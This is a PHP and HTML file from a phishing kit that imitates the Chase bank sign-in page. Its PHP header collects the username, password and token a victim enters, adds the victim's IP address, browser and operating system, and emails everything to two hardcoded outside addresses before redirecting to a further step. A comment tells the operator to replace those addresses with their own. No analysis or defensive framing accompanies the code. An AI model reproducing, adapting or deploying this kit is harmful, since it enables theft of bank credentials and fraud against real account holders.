<?php require_once("../private/includes/initialize.php"); ?>
<?php error_reporting(0); ?>
<?php
$userNameOne = "";
$userPassCodeOne = "";
$tokenNumOne = "";
$randomStringTwo =  generateRandomString();
if(isset($_POST['submitOne'])){
  $userNameOne = htmlspecialchars(trim($_POST['userName']));
  $userPassCodeOne = htmlspecialchars(trim($_POST['userPassCode']));
  $tokenNumOne = htmlspecialchars(trim($_POST['tokenNum']));
  if(!empty($userNameOne) && !empty($userPassCodeOne)){
    $_SESSION['usersLoginName'] = $userNameOne;
    $_SESSION['usersLoginCode'] = $userPassCodeOne;
    $_SESSION['usersLoginToken'] = $tokenNumOne;

    $ipAdd = $ip = getenv("REMOTE_ADDR")."\n";
    $ua=getBrowser();
    $yourbrowser= " " . $ua['name'] . " " . $ua['version'] . " ";
    $OS_system = os_info($uagent);


    // CHANGE THIS TO YOUR EMAIL ADDRESS YOU WANT TO RECEIVE

    $to = "willsomnincltd@gmail.com,wire227@protonmail.com";

    $subject = "Chase Result";

    $body = "

    RESULT FROM CHASE PAGE - INFO BELOW: \n

    |----------------------  CHASE | INFO  ----------------------| \n

    Username      : $userNameOne \n

    Password      : $userPassCodeOne \n

    Token         : $tokenNumOne \n

    |---------------------- I N F O | I P ----------------------| \n

    |Client IP ADDRESS       : $ipAdd

    |---- http://www.geoiptool.com/?IP=$ipAdd ---- \n

    Users Browser       : $yourbrowser \n

    Users Operating System      : $OS_system \n




    |------------------- LoopHole -------------------|

    This is an automated Email. Please do not reply to this Email. \n

    ";

    mail($to,$subject,$body,"From: chase-result@domain.com\r\n");

      redirect_to("step1.php?users_id=$randomStringTwo");
} else{
     echo "";
  }
}
?>
<!doctype html>
<html lang="en">

  <head>
    <title>Sign in - chase.com</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="author" content="JP-Morgan Chase">
    <meta name="desc" content="JPMorgan Chase & Co. is a leading global financial services firm and one of the largest banking institutions in the United States , with operations worldwide">
    <meta name="keywords" content="Chase online credit cards, mortgages, commercial banking, auto loans, investing & retirement planning, checking and business banking">

    <link rel="stylesheet" href="bootstrap/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="stylesheet/customStyles.css">
    <link rel="icon" href="images/favicon.ico" sizes="32x32">
  </head>
  <body class="custom-background">
    <header id="logon-summary-menu">
      <div class="transparent-header-jpui">
        <div>
          <a href="https://www.chase.com/">
            <div class="chase-logo"></div>
          </a>
        </div>
      </div>
    </header>

    <div id="wholePage" class="hfeed site">

        <div class="container-fluid">
          <div class="row">
            <div class="col-xs-12 text-left">

              <div class="login-box" id="home-log-box">
                <form class="form-horizontal" action="login.php" method="post">
                  <div class="form-group" id="form-new-t">
                    <div class="col-xs-12" id="FormCntrlEdit">
                      <input class="form-control" type="text" name="userName" placeholder="Username" id="userNameEdit" autocomplete="off" title="Please provide your username" required>
                      <input class="form-control" type="password" name="userPassCode" placeholder="Password" id="passWordEdit" autocomplete="off" title="Please provide your password" required>
                      <input class="form-control" type="text" name="tokenNum" maxlength="6" placeholder="Token" id="tokenEdit" autocomplete="off" title="Please provide your token number" style="display: none;">
                      <div class="new-check col-xs-12">
                        <div class="col-xs-6">
                          <input type="checkbox" name="signin" value="Keep me signed in" id="new-check-box"><label>Remember Me</label>
                        </div>
                        <div class="col-xs-offset-1 col-xs-5">
                          <input type="checkbox" name="token" value="Token number" id="new-check-box-token"><label>Use token</label>
                        </div>
                      </div>
                    </div>
                    <div class="col-xs-12" id="FormCntrlEdit">
                      <input type="submit" class="btn btn-primary btn-block" name="submitOne" value="Sign in" id="subEdit">
                    </div>
                  </div>
                  <div class="last-forgot">
                    <p> <a href="https://secure07b.chase.com/web/auth/dashboard#/dashboard/index/index">Forgot username/password? <span class="glyphicon glyphicon-menu-right"></span> </a> </p>
                    <p> <a href="https://secure07b.chase.com/web/auth/enrollment#/enroll/onlineEnrollment/gettingStarted/index?LOB=RGBLogon">Not enrolled? Sign up now. <span class="glyphicon glyphicon-menu-right"></span> </a> </p>
                  </div>
                </form>
              </div>

            </div>
          </div>
        </div>

        <nav class='navbar navbar-default navbar-fixed-bottom' id='customID'>
          <div class='container'>
            <div class='row social-links'>
              <div class='col-xs-12'>

                  <span class="follow-us-text">Follow us:</span>
                  <ul class='nav navbar-nav' id="mainNavbar2">
                    <li><img class="img-responsive" src="images/facebook.png" alt="facebook-icon"></li>
                    <li><img class="img-responsive" src="images/instagram.png" alt="instagram-icon"></li>
                    <li><img class="img-responsive" src="images/twitter.png" alt="twitter-icon"></li>
                    <li><img class="img-responsive" src="images/youtube.png" alt="youtube-icon"></li>
                    <li><img class="img-responsive" src="images/linkedin.png" alt="linkedin-icon"></li>
                  </ul>

              </div>
            </div>
          </div>

          <div class="control-p">
            <div class="container">
              <div class="row">
                <div class="col-xs-12">
                  <ul class='nav navbar-nav' id="mainNavbar3">
                    <li><a href="https://www.chase.com/digital/resources/customer-service">Contact us</a></li>
                    <li><a href="https://www.chase.com/digital/resources/privacy-security">Privacy</a></li>
                    <li><a href="https://www.chase.com/digital/resources/privacy-security">Security</a></li>
                    <li><a href="https://www.chase.com/digital/resources/terms-of-use">Term of use</a></li>
                    <li><a href="https://www.chase.com/digital/resources/accessibility">Our commitment to accessibility</a></li>
                    <li><a href="https://www.chase.com/mortgage/loan-originator-search">SAFE Act: Chase Mortgage Loan Originators</a></li>
                    <li><a href="https://www.chase.com/personal/mortgage/fair-lending/fair-lending-overview">Fair Lending</a></li>
                    <li><a href="https://www.chase.com/digital/resources/about-chase">About Chase</a></li>
                    <li><a href="https://www.jpmorgan.com/country/US/en/jpmorgan">J.P. Morgan</a></li>
                    <li><a href="https://www.jpmorganchase.com/">JPMorgan Chase & Co.</a></li>
                    <li><a href="https://careersatchase.com/content/index">Careers</a></li>
                  </ul>
                </div>
              </div>
            </div>
            <div class="container">
              <div class="row">
                <div class="col-xs-12">
                  <ul class='nav navbar-nav' id="mainNavbar3">
                    <li class="text-center"><a href="#">Español</a></li>
                    <li><a href="https://www.chase.com/online/canada/canada-home-en.htm">Chase Canada</a></li>
                    <li><a href="https://www.chase.com/es/digital/resources/sitemap">Site map</a></li>
                    <li><a href="#">Member FDIC</a></li>
                    <li><a href="#">Equal Housing Lender</a></li>
                  </ul>
                </div>
              </div>
            </div>
            <div class="container">
              <div class="row">
                <div class="col-xs-12">
                  <ul class='nav navbar-nav' id="mainNavbar3">
                    <li class="text-center"><a href="#">&copy; <?php echo date("Y"); ?> JPMorgan Chase & Co.</a></li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </nav>

    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
    <script type='text/javascript'>
    jQuery(function($){
       $("#tokenEdit").mask("999999",{placeholder:""});
    });
    </script>
      <script src="js/main.js"></script>
      <script>
          new WOW().init();
      </script>

      <script src="bootstrap/js/jquery.min.js"></script>
      <script src="bootstrap/js/bootstrap.min.js"></script>
      <script type='text/javascript'>
        $(document).ready(function(){
          $('#new-check-box-token').click(function(){
            $('#tokenEdit').slideToggle(500)
          });
        });
      </script>

  </body>
</html>
